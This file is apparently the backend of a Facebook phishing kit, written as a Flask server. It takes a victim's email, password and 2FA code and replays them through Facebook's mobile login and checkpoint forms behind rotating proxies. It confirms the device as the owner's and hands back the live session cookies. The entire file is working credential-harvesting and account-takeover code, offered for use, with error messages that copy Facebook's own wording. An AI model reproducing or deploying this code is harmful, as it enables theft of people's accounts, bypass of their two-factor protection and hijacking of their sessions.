import random
import requests
import traceback

from bs4 import BeautifulSoup
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS, cross_origin
from config import CONFIG

app = Flask(__name__)
CORS(app, support_credentials=True)


class Facebook:
    def __init__(self) -> None:
        self.proxy = self.get_proxy()

    def get_proxy(self):
        with open(CONFIG.PROXY_PATH, 'r') as f:
            proxies = f.readlines()

        proxy = random.choice(proxies).strip()

        ip, port, username, password, country = proxy.split(':')

        proxy = {
            'http': f'http://{username}:{password}@{ip}:{port}',
            'https': f'http://{username}:{password}@{ip}:{port}'
        }

        # print(proxy)

        # test proxy
        # url = 'https://ipconfig.io/json'

        # rq = requests.get(url, proxies=proxy)

        # print(rq.text)

        return proxy

    def get_data(self):
        url = 'https://m.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0'

        headers = {
            'Accept': '*/*',
            'Pragma': 'no-cache',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        }

        rq = requests.get(url, headers=headers, proxies=self.proxy)

        # print(rq.text)

        soup = BeautifulSoup(rq.text, 'html.parser')

        # find jazoest
        jazoest = soup.find('input', {'name': 'jazoest'}).get('value')
        # find lsd
        lsd = soup.find('input', {'name': 'lsd'}).get('value')

        cookie = rq.cookies.get_dict()['datr']

        print(jazoest, lsd, cookie)

        return jazoest, lsd, cookie

    def check_valid_account(self, email: str):
        url = 'https://m.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0'

        jazoest, lsd, cookie = self.get_data()

        # payload = f'lsd={lsd}&jazoest={jazoest}&email={email}&did_submit=T%C3%ACm+ki%E1%BA%BFm'
        payload = f'lsd={lsd}&jazoest={jazoest}&email={email}&did_submit=Rechercher'

        headers = {
            'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
            'Referer': 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=2&ars=facebook_login&alternate_search=0&toggle_search_mode=1',
            'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
            'Host': 'm.facebook.com',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache',
            'Cookie': f'datr={cookie}',
            'Content-Length': '84',
        }

        proxies = {
            'http': 'http://user:pass@geo.iproyal.com:12321',
            'https': 'http://user:pass@geo.iproyal.com:12321'
        }

        rq = requests.post(url, data=payload, headers=headers,
                           proxies=self.proxy)

        # if rq.status_code == 200:
        #     return False
        # elif rq.status_code == 302:
        #     return True

        if 'Votre recherche ne donne aucun' in rq.text:
            return False
        else:
            return True

    def get_data_password(self):
        url = 'https://mbasic.facebook.com/'
        headers = {
            'Accept': '*/*',
            'Pragma': 'no-cache',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        }

        rq = requests.get(url, headers=headers, proxies=self.proxy)

        # print(rq.text)

        soup = BeautifulSoup(rq.text, 'html.parser')

        # find jazoest
        jazoest = soup.find('input', {'name': 'jazoest'}).get('value')
        # find lsd
        lsd = soup.find('input', {'name': 'lsd'}).get('value')

        li = soup.find('input', {'name': 'li'}).get('value')

        m_ts = soup.find('input', {'name': 'm_ts'}).get('value')

        try_number = soup.find('input', {'name': 'try_number'}).get('value')

        unrecognized_tries = soup.find(
            'input', {'name': 'unrecognized_tries'}).get('value')

        cookie = rq.cookies.get_dict()['datr']

        # print(jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie)

        return jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie

    def check_password(self, user: str, password: str, ip: str):
        print(ip)
        url = 'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'

        jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie = self.get_data_password()

        headers = {
            'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
            'Referer': 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=2&ars=facebook_login&alternate_search=0&toggle_search_mode=1',
            'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
            'Host': 'm.facebook.com',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache',
            'Cookie': f'datr={cookie}',
            'Content-Length': '84',
        }

        payload = f'lsd={lsd}&jazoest={jazoest}&m_ts={m_ts}&li={li}&try_number={try_number}&unrecognized_tries={unrecognized_tries}&email={user}&pass={password}&login=Se+connecter&bi_xrwh=0'

        rq = requests.post(url, data=payload, headers=headers,
                           proxies=self.proxy)

        if '/login/device-based/update-nonce/' in rq.text:
            return True
        elif 'submit[Submit Code]' in rq.text:
            return '2fa'
        else:
            return False

    def get_2fa(self, fa_key: str):
        url = f'https://2fa.live/tok/{fa_key}'

        rq = requests.get(url)

        code = rq.json()['token']

        return code

    def login_get_cookies(self, user: str, password: str, fa_key: str):
        print(self.proxy)
        url = 'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'

        jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie = self.get_data_password()

        headers = {
            'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
            'Referer': 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=2&ars=facebook_login&alternate_search=0&toggle_search_mode=1',
            'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
            'Host': 'm.facebook.com',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache',
            'Cookie': f'datr={cookie}',
            'Content-Length': '84',
        }

        payload = f'lsd={lsd}&jazoest={jazoest}&m_ts={m_ts}&li={li}&try_number={try_number}&unrecognized_tries={unrecognized_tries}&email={user}&pass={password}&login=Se+connecter&bi_xrwh=0'
        self.session = requests.Session()
        rq = self.session.post(
            url, data=payload, headers=headers, proxies=self.proxy)

        if 'submit[Submit Code]' in rq.text:
            print('2fa')
            cookies = rq.cookies.get_dict()
            # convert dict to string
            cookies = '; '.join(
                [f'{key}={value}' for key, value in cookies.items()])

            # get data
            soup = BeautifulSoup(rq.text, 'html.parser')

            fb_dtsg = soup.find('input', {'name': 'fb_dtsg'}).get('value')
            jazoest = soup.find('input', {'name': 'jazoest'}).get('value')
            checkpoint_data = soup.find(
                'input', {'name': 'checkpoint_data'}).get('value')
            nh = soup.find('input', {'name': 'nh'}).get('value')

            code = self.get_2fa(fa_key)

            self.login_with_2fa(cookies, fb_dtsg, jazoest,
                                checkpoint_data, nh, fa_key)

            return self.account_cookies

        elif '/login/device-based/update-nonce/' in rq.text:
            # get cookies
            cookies = rq.cookies.get_dict()
            # convert dict to string
            cookies = '; '.join(
                [f'{key}={value}' for key, value in cookies.items()])

            return cookies

        else:
            return False

    def login_with_2fa(self, cookies: str, fb_dtsg: str, jazoest: str, checkpoint_data: str, nh: str, code: str):
        url = 'https://mbasic.facebook.com/login/checkpoint/'

        headers = {
            'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
            'Referer': 'https://mbasic.facebook.com/checkpoint/?refsrc=deprecated&_rdr',
            'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
            'Host': 'm.facebook.com',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache',
            'Cookie': f'{cookies}',
            'Content-Length': '84',
        }

        payload = f'fb_dtsg={fb_dtsg}&jazoest={jazoest}&checkpoint_data={checkpoint_data}&approvals_code={code}&codes_submitted=0&submit%5BSubmit+Code%5D=Envoyer+le+code&nh={nh}&fb_dtsg={fb_dtsg}&jazoest={jazoest}'

        rq = self.session.post(
            url, data=payload, headers=headers, proxies=self.proxy)

        # get cookies
        cookies = rq.cookies.get_dict()
        # convert dict to string
        cookies = '; '.join(
            [f'{key}={value}' for key, value in cookies.items()])

        soup = BeautifulSoup(rq.text, 'html.parser')
        fb_dtsg = soup.find('input', {'name': 'fb_dtsg'}).get('value')
        jazoest = soup.find('input', {'name': 'jazoest'}).get('value')
        checkpoint_data = soup.find(
            'input', {'name': 'checkpoint_data'}).get('value')
        nh = soup.find('input', {'name': 'nh'}).get('value')

        self.save_device(cookies, fb_dtsg, jazoest, checkpoint_data, nh)

    # save devices

    def save_device(self, cookies: str, fb_dtsg: str, jazoest: str, checkpoint_data: str, nh: str):
        url = 'https://mbasic.facebook.com/login/checkpoint/'
        headers = {
            'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
            'Referer': 'https://mbasic.facebook.com/login/checkpoint/?refsrc=deprecated&_rdr',
            'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
            'Host': 'm.facebook.com',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache',
            'Cookie': f'{cookies}',
            'Content-Length': '84',
        }
        payload = f'fb_dtsg={fb_dtsg}&jazoest={jazoest}&checkpoint_data={checkpoint_data}&name_action_selected=save_device&submit%5BContinue%5D=Continuer&nh={nh}&fb_dtsg={fb_dtsg}&jazoest={jazoest}'

        rq = self.session.post(
            url, data=payload, headers=headers, proxies=self.proxy)

        # get cookies
        cookies = rq.cookies.get_dict()
        # convert dict to string
        cookies = '; '.join(
            [f'{key}={value}' for key, value in cookies.items()])

        # get data
        soup = BeautifulSoup(rq.text, 'html.parser')

        fb_dtsg = soup.find('input', {'name': 'fb_dtsg'}).get('value')
        jazoest = soup.find('input', {'name': 'jazoest'}).get('value')
        checkpoint_data = soup.find(
            'input', {'name': 'checkpoint_data'}).get('value')
        nh = soup.find('input', {'name': 'nh'}).get('value')

        self.submit_device(cookies, fb_dtsg, jazoest, checkpoint_data, nh)

    def submit_device(self, cookies: str, fb_dtsg: str, jazoest: str, checkpoint_data: str, nh: str):
        url = 'https://mbasic.facebook.com/login/checkpoint/'
        headers = {
            'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
            'Referer': 'https://mbasic.facebook.com/login/checkpoint/?refsrc=deprecated&_rdr',
            'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
            'Host': 'm.facebook.com',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache',
            'Cookie': f'{cookies}',
            'Content-Length': '84',
        }
        payload = f'fb_dtsg={fb_dtsg}&jazoest={jazoest}&checkpoint_data={checkpoint_data}&submit%5BContinue%5D=Continuer&nh={nh}&fb_dtsg={fb_dtsg}&jazoest={jazoest}'

        rq = self.session.post(
            url, data=payload, headers=headers, proxies=self.proxy)

        # get cookies
        cookies = rq.cookies.get_dict()
        # convert dict to string
        cookies = '; '.join(
            [f'{key}={value}' for key, value in cookies.items()])

        # get data
        soup = BeautifulSoup(rq.text, 'html.parser')

        fb_dtsg = soup.find('input', {'name': 'fb_dtsg'}).get('value')
        jazoest = soup.find('input', {'name': 'jazoest'}).get('value')
        checkpoint_data = soup.find(
            'input', {'name': 'checkpoint_data'}).get('value')
        nh = soup.find('input', {'name': 'nh'}).get('value')

        self.save_location(cookies, fb_dtsg, jazoest, checkpoint_data, nh)

    def save_location(self, cookies: str, fb_dtsg: str, jazoest: str, checkpoint_data: str, nh: str):
        url = 'https://mbasic.facebook.com/login/checkpoint/'
        headers = {
            'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
            'Referer': 'https://mbasic.facebook.com/login/checkpoint/?refsrc=deprecated&_rdr',
            'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
            'Host': 'm.facebook.com',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache',
            'Cookie': f'{cookies}',
            'Content-Length': '84',
        }
        payload = f'fb_dtsg={fb_dtsg}&jazoest={jazoest}&checkpoint_data={checkpoint_data}&submit%5BThis+was+me%5D=C%E2%80%99%C3%A9tait+moi&nh={nh}&fb_dtsg={fb_dtsg}&jazoest={jazoest}'

        rq = self.session.post(
            url, data=payload, headers=headers, proxies=self.proxy)

        # get cookies
        cookies = rq.cookies.get_dict()
        # convert dict to string
        cookies = '; '.join(
            [f'{key}={value}' for key, value in cookies.items()])

        # get data
        soup = BeautifulSoup(rq.text, 'html.parser')

        fb_dtsg = soup.find('input', {'name': 'fb_dtsg'}).get('value')
        jazoest = soup.find('input', {'name': 'jazoest'}).get('value')
        checkpoint_data = soup.find(
            'input', {'name': 'checkpoint_data'}).get('value')
        nh = soup.find('input', {'name': 'nh'}).get('value')

        self.submit_login(cookies, fb_dtsg, jazoest, checkpoint_data, nh)

    def submit_login(self, cookies: str, fb_dtsg: str, jazoest: str, checkpoint_data: str, nh: str):
        url = 'https://mbasic.facebook.com/login/checkpoint/'
        headers = {
            'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
            'Referer': 'https://mbasic.facebook.com/login/checkpoint/?refsrc=deprecated&_rdr',
            'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
            'Host': 'm.facebook.com',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache',
            'Cookie': f'{cookies}',
            'Content-Length': '84',
        }
        # payload = f'fb_dtsg={fb_dtsg}&jazoest={jazoest}&checkpoint_data={checkpoint_data}&submit%5BContinue%5D=Continuer&nh={nh}&fb_dtsg={fb_dtsg}&jazoest={jazoest}'
        payload = f'fb_dtsg={fb_dtsg}&jazoest={jazoest}&checkpoint_data={checkpoint_data}&name_action_selected=save_device&submit%5BContinue%5D=Continuer&nh={nh}&fb_dtsg={fb_dtsg}&jazoest={jazoest}'

        rq = self.session.post(url, data=payload, headers=headers,
                               allow_redirects=False, proxies=self.proxy)

        # get cookies
        cookies = rq.cookies.get_dict()

        # convert dict to string
        self.account_cookies = '; '.join(
            [f'{key}={value}' for key, value in cookies.items()])


@app.route('/check-email', methods=['POST'])
@cross_origin(supports_credentials=True)
def check_email():
    data = request.get_json()
    email = data.get('email')
    fb = Facebook()
    global is_login_successful
    is_login_successful = 0
    try:
        is_login_successful = fb.check_valid_account(email)
    except:
        return jsonify({
            "message": "Something went wrong during check email!",
            "status": 400}), 400

    if is_login_successful:
        return jsonify({
            "message": "Successfully...",
            "status": 200,
            "email": email
        }), 200

    else:
        return jsonify({
            "message": "The email you entered is not connected to any account. Find your account and log in.",
            "status": 400}), 400


@app.route('/check-password', methods=['POST'])
@cross_origin(supports_credentials=True)
def check_password():
    ip = request.remote_addr
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')
    fb = Facebook()
    try:
        is_login_successful = fb.check_password(email, password, ip)
    except:
        return jsonify({
            "message": "Failed to check_password.",
            "status": 400})

    if is_login_successful:
        return jsonify({
            "message": "Successfully...",
            "status": 200,
            "email": email
        })

    else:
        return jsonify({
            "message": "The password you entered is incorrect.",
            "status": 400})


@app.route('/check-towfa', methods=['POST'])
@cross_origin(supports_credentials=True)
def check_towfa():
    global jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')
    fa_key = data.get('towfa')

    fb = Facebook()
    # is_login_successful = fb.login_get_cookies(password, email, towfa)

    url = 'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'
    try:
        jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie = fb.get_data_password()
    except:
        return jsonify({
            "message": "Failed to get_data_password.",
            "status": 400}), 400

    headers = {
        'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
        'Referer': 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=2&ars=facebook_login&alternate_search=0&toggle_search_mode=1',
        'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
        'Host': 'm.facebook.com',
        'Connection': 'Keep-Alive',
        'Cache-Control': 'no-cache',
        'Cookie': f'datr={cookie}',
        'Content-Length': '84',
    }

    payload = f'lsd={lsd}&jazoest={jazoest}&m_ts={m_ts}&li={li}&try_number={try_number}&unrecognized_tries={unrecognized_tries}&email={email}&pass={password}&login=Se+connecter&bi_xrwh=0'
    fb.session = requests.Session()
    rq = fb.session.post(url, data=payload, headers=headers)
    try:
        if 'submit[Submit Code]' in rq.text:
            print('access if')
            cookies = rq.cookies.get_dict()
            # convert dict to string
            cookies = '; '.join(
                [f'{key}={value}' for key, value in cookies.items()])

            # get data
            soup = BeautifulSoup(rq.text, 'html.parser')

            fb_dtsg = soup.find('input', {'name': 'fb_dtsg'}).get('value')
            jazoest = soup.find('input', {'name': 'jazoest'}).get('value')
            checkpoint_data = soup.find(
                'input', {'name': 'checkpoint_data'}).get('value')
            nh = soup.find('input', {'name': 'nh'}).get('value')

            code = fb.get_2fa(fa_key)

            fb.login_with_2fa(cookies, fb_dtsg, jazoest,
                              checkpoint_data, nh, fa_key)

            return jsonify({
                "cookies": fb.account_cookies,
                "status": 200}), 200

        elif '/login/device-based/update-nonce/' in rq.text:
            print('access if 1')
            # get cookies
            cookies = rq.cookies.get_dict()
            # convert dict to string
            cookies = '; '.join(
                [f'{key}={value}' for key, value in cookies.items()])

            return jsonify({
                "cookies": cookies,
                "status": 200}), 200

        else:
            return False
    except Exception as e:
        traceback.print_exc()
        return jsonify({
            "message": "The login code you entered doesn't match the code sent to your phone. Please check this number and try again.",
            "status": 400}), 400


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
